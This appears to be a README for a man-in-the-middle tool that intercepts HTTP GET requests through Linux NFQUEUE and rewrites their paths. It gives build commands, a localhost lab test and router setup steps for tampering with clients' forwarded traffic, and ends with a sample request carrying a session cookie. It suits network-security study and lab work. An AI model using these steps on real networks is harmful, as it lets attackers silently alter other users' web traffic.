## attacker_mitm — NFQUEUE HTTP path rewriter

Intercepts forwarded TCP packets via Linux NFQUEUE and rewrites the path in
HTTP GET requests inline. Because TCP sequence numbers are not adjusted,
both paths must be the same byte length.

### Build

```bash
make attacker_mitm
# Or attacker_mitm_no_variable_length.c
# Or attacker_mitm_no_variable_length_get.c
# requires: libnetfilter_queue-dev  (apt install libnetfilter-queue-dev)
```

### Localhost test (no external device needed)

```bash
# 1. Serve two pages from a local HTTP server on port 8080
mkdir -p /tmp/www/original /tmp/www/replaced
echo "YOU GOT ORIGINAL" > /tmp/www/original/index.html
echo "YOU GOT REPLACED" > /tmp/www/replaced/index.html
python3 -m http.server 8080 --directory /tmp/www

# 2. Load the nftables OUTPUT rule (queue local traffic to port 8080)
#    Edit nfqueue.nft: comment out 'chain forward', uncomment 'chain output'
sudo nft -f nfqueue.nft

# 3. Start the attacker (paths must be equal length: 9 chars each)
sudo ./attacker_mitm /original /replaced

# 4. Trigger from another terminal
curl http://localhost:8080/original/
# Expected response: "YOU GOT REPLACED"

# 5. Cleanup
sudo nft flush ruleset
```

### Router / MITM use (forwarded traffic)

Use `chain forward` in `nfqueue.nft` (default). The machine must be configured
as a router (`net.ipv4.ip_forward=1`) with clients sending HTTP through it.

```bash
sudo sysctl -w net.ipv4.ip_forward=1
sudo nft -f nfqueue.nft
sudo ./attacker_mitm /foo /bar   # same-length paths
```

---

Keep in mind the http format with cookies:


```yaml
GET /path/to/resource HTTP/1.1\r\n
Host: www.example.com\r\n
User-Agent: Mozilla/5.0...\r\n
Accept: text/html\r\n
Cookie: session_id=12345abcde; user_pref=dark_mode\r\n
\r\n
```